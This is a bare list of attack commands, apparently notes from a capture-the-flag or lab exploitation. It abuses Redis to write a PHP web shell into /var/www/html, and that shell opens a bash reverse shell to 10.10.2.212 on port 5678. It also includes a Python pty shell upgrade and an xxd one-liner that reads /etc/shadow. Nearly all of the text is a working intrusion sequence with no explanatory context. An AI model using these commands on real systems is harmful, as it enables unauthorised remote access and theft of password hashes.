config set dir /var/www/html
python -c 'import pty; pty.spawn("/bin/bash")'

config set dbfilename shell.php
set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.2.212/5678 0>&1'\"); ?>"
save

LFILE=/etc/shadow
xxd "$LFILE" | xxd -r 
